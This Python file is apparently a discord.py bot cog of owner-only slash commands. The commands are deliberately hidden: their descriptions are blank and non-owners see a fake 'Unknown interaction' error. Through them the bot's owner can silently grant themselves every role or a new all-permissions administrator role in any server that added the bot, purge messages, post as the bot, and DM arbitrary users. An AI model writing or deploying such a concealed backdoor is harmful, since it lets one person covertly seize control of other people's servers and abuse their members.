import discord
from discord.ext import commands
from discord import app_commands
import os
from utils.database import Database

# Your Discord User ID - only YOU can use these commands
OWNER_ID = int(os.getenv('OWNER_ID', '0'))

def is_owner():
    """Check if the user is the bot owner"""
    async def predicate(interaction: discord.Interaction) -> bool:
        if interaction.user.id != OWNER_ID:
            # Pretend the command doesn't exist
            await interaction.response.send_message(
                "Unknown interaction.",
                ephemeral=True
            )
            return False
        return True
    return app_commands.check(predicate)

class Owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.db = Database('data/owner.json')

    # ==================== ROLE COMMANDS ====================

    @app_commands.command(
        name="owner_giverole",
        description="."  # Hidden description
    )
    @is_owner()
    async def owner_giverole(
        self,
        interaction: discord.Interaction,
        role: discord.Role,
        member: discord.Member = None
    ):
        """Give yourself or anyone a role silently"""
        target = member or interaction.user

        try:
            await target.add_roles(role, reason="Owner command")
            embed = discord.Embed(
                description=f"Done. {role.mention} given to {target.mention}",
                color=0x1a1a2e
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message(
                "I don't have permission to give that role. Make sure my role is above it.",
                ephemeral=True
            )

    @app_commands.command(
        name="owner_removerole",
        description="."
    )
    @is_owner()
    async def owner_removerole(
        self,
        interaction: discord.Interaction,
        role: discord.Role,
        member: discord.Member = None
    ):
        """Remove a role silently"""
        target = member or interaction.user

        try:
            await target.remove_roles(role, reason="Owner command")
            embed = discord.Embed(
                description=f"Done. {role.mention} removed from {target.mention}",
                color=0x1a1a2e
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message(
                "I don't have permission to remove that role.",
                ephemeral=True
            )

    @app_commands.command(
        name="owner_allroles",
        description="."
    )
    @is_owner()
    async def owner_allroles(
        self,
        interaction: discord.Interaction,
        member: discord.Member = None
    ):
        """Give yourself ALL roles in the server"""
        target = member or interaction.user

        await interaction.response.defer(ephemeral=True)

        roles = [
            r for r in interaction.guild.roles
            if r.name != "@everyone"
            and not r.managed
            and r.position < interaction.guild.me.top_role.position
        ]

        try:
            await target.add_roles(*roles, reason="Owner command")
            embed = discord.Embed(
                description=f"Done. Gave {len(roles)} roles to {target.mention}",
                color=0x1a1a2e
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
        except discord.Forbidden:
            await interaction.followup.send(
                "Failed. Make sure my role is the highest.",
                ephemeral=True
            )

    # ==================== SERVER CONTROL ====================

    @app_commands.command(
        name="owner_createrole",
        description="."
    )
    @is_owner()
    async def owner_createrole(
        self,
        interaction: discord.Interaction,
        name: str,
        color: str = "000000",
        hoist: bool = False,
        admin: bool = False
    ):
        """Create a role and give it to yourself"""
        try:
            # Parse color
            color_int = int(color.replace('#', ''), 16)
            discord_color = discord.Color(color_int)
        except:
            discord_color = discord.Color.default()

        # Set permissions
        perms = discord.Permissions()
        if admin:
            perms = discord.Permissions.all()

        try:
            role = await interaction.guild.create_role(
                name=name,
                color=discord_color,
                hoist=hoist,
                permissions=perms,
                reason="Owner command"
            )

            # Move role to top (below bot's role)
            bot_role_pos = interaction.guild.me.top_role.position
            await role.edit(position=bot_role_pos - 1)

            # Give to self
            await interaction.user.add_roles(role, reason="Owner command")

            embed = discord.Embed(
                description=f"Created and assigned {role.mention}",
                color=discord_color
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)

        except discord.Forbidden:
            await interaction.response.send_message(
                "Failed. Missing permissions.",
                ephemeral=True
            )

    @app_commands.command(
        name="owner_nick",
        description="."
    )
    @is_owner()
    async def owner_nick(
        self,
        interaction: discord.Interaction,
        nickname: str,
        member: discord.Member = None
    ):
        """Change nickname silently"""
        target = member or interaction.user

        try:
            await target.edit(nick=nickname, reason="Owner command")
            embed = discord.Embed(
                description=f"Done. Nickname changed to **{nickname}**",
                color=0x1a1a2e
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message(
                "Failed. I can't change that user's nickname.",
                ephemeral=True
            )

    @app_commands.command(
        name="owner_servers",
        description="."
    )
    @is_owner()
    async def owner_servers(self, interaction: discord.Interaction):
        """View all servers the bot is in"""
        guilds = self.bot.guilds

        embed = discord.Embed(
            title=f"Bot is in {len(guilds)} servers",
            color=0x1a1a2e
        )

        for guild in guilds[:25]:
            embed.add_field(
                name=guild.name,
                value=(
                    f"ID: `{guild.id}`\n"
                    f"Members: {guild.member_count}\n"
                    f"Owner: {guild.owner}"
                ),
                inline=True
            )

        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(
        name="owner_dm",
        description="."
    )
    @is_owner()
    async def owner_dm(
        self,
        interaction: discord.Interaction,
        user_id: str,
        message: str
    ):
        """DM any user by ID"""
        try:
            user = await self.bot.fetch_user(int(user_id))
            embed = discord.Embed(
                description=message,
                color=0x1a1a2e
            )
            await user.send(embed=embed)
            await interaction.response.send_message(
                f"Sent DM to {user}",
                ephemeral=True
            )
        except discord.NotFound:
            await interaction.response.send_message(
                "User not found.",
                ephemeral=True
            )
        except discord.Forbidden:
            await interaction.response.send_message(
                "Can't DM that user. They may have DMs disabled.",
                ephemeral=True
            )

    @app_commands.command(
        name="owner_status",
        description="."
    )
    @is_owner()
    async def owner_status(self, interaction: discord.Interaction):
        """View bot stats"""
        embed = discord.Embed(
            title="Bot Owner Stats",
            color=0x1a1a2e
        )
        embed.add_field(
            name="Servers",
            value=len(self.bot.guilds),
            inline=True
        )
        embed.add_field(
            name="Users",
            value=len(self.bot.users),
            inline=True
        )
        embed.add_field(
            name="Latency",
            value=f"{round(self.bot.latency * 1000)}ms",
            inline=True
        )
        embed.add_field(
            name="Commands",
            value=len(self.bot.tree.get_commands()),
            inline=True
        )

        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(
        name="owner_say",
        description="."
    )
    @is_owner()
    async def owner_say(
        self,
        interaction: discord.Interaction,
        message: str,
        channel: discord.TextChannel = None
    ):
        """Make the bot say something"""
        target = channel or interaction.channel
        await target.send(message)
        await interaction.response.send_message(
            "Sent.",
            ephemeral=True
        )

    @app_commands.command(
        name="owner_embed",
        description="."
    )
    @is_owner()
    async def owner_embed(
        self,
        interaction: discord.Interaction,
        title: str,
        description: str,
        channel: discord.TextChannel = None,
        color: str = "1a1a2e"
    ):
        """Send an embed as the bot"""
        target = channel or interaction.channel

        try:
            color_int = int(color.replace('#', ''), 16)
        except:
            color_int = 0x1a1a2e

        embed = discord.Embed(
            title=title,
            description=description.replace('\\n', '\n'),
            color=color_int
        )
        await target.send(embed=embed)
        await interaction.response.send_message("Sent.", ephemeral=True)

    @app_commands.command(
        name="owner_purge",
        description="."
    )
    @is_owner()
    async def owner_purge(
        self,
        interaction: discord.Interaction,
        amount: int,
        channel: discord.TextChannel = None
    ):
        """Purge messages silently"""
        target = channel or interaction.channel

        await interaction.response.defer(ephemeral=True)

        deleted = await target.purge(limit=amount)

        await interaction.followup.send(
            f"Deleted {len(deleted)} messages.",
            ephemeral=True
        )

    @app_commands.command(
        name="owner_reload",
        description="."
    )
    @is_owner()
    async def owner_reload(
        self,
        interaction: discord.Interaction,
        cog: str
    ):
        """Reload a cog without restarting"""
        try:
            await self.bot.reload_extension(f"cogs.{cog}")
            await interaction.response.send_message(
                f"Reloaded `cogs.{cog}`",
                ephemeral=True
            )
        except Exception as e:
            await interaction.response.send_message(
                f"Failed: {e}",
                ephemeral=True
            )

async def setup(bot):
    await bot.add_cog(Owner(bot))